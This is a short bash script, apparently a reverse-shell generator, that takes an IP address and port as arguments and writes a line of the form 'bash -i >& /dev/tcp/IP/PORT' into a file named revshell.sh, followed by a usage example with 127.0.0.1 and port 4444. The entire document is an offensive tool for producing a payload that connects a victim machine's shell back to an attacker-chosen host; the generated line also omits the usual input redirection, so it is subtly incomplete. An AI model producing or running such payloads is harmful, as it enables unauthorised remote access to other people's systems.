ip=$1
port=$2
echo $ip
echo "bash -i >& /dev/tcp/$ip/$port" > revshell.sh


## Example
# bash revshell_gen.sh 127.0.0.1 4444 
